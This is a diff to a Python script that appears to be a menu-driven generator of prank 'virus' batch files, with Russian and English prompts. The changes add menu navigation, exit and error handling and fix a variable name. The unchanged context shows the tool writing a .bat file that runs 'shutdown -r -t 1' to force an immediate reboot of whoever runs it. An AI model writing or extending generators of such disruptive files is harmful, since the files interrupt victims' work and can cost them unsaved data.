@@ -1002,10 +1002,21 @@ def viruses():
 			k = open(n,"w",encoding='utf-8')
 			k.write("""@echo off shutdown -r -t 1 -c "lol" >nul""")
 			k.close()
+		def back():
+			viruses()
 		if bat ==1:
 			bat1()
-		elif bat2==2:
+		elif bat==2:
 			bat2()
+		elif bat ==99:
+			back()
+		elif bat ==0:
+			print("\033[32mПрощайте!(Goodbye!)")
+			raise SystemExit
+		else:
+			print('\033[31mОшибка:не найдено(Error:not found)')
+			time.sleep(2)
+			virus1()
 	if vir ==0:
 		virus0()
 	elif vir ==99:
